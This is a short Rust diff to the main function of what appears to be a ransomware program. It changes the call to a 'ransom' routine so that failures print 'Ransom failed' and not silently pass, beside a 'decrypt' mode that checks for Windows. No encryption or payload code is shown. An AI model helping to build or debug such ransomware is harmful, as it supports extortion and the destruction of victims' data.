@@ -47,7 +47,10 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             std::process::exit(1);
         });
 
-        let _ = ransom::ransom(logger.clone(), &config).await;
+        if let Err(e) = ransom::ransom(logger.clone(), &config).await {
+            eprintln!("Ransom failed: {}", e);
+        }
+
     } else if args.mode == "decrypt" {
         if family == "windows" {
             logger.log("Windows OS detected");
